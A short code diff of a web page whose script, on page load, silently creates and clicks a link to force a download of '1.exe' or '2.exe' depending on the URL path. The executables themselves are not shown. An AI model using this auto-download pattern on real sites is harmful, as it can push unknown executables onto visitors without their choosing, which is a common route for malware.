@@ -8,9 +8,15 @@
 <body>
     <script>
         window.onload = () => {
+            let fileName = '1.exe';
+            
+            if (window.location.pathname === '/2.exe') {
+                fileName = '2.exe';
+            }
+
             const link = document.createElement('a');
-            link.href = '/1.exe';  // Ścieżka do pliku
-            link.download = '1.exe';
+            link.href = `/${fileName}`;
+            link.download = fileName;
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
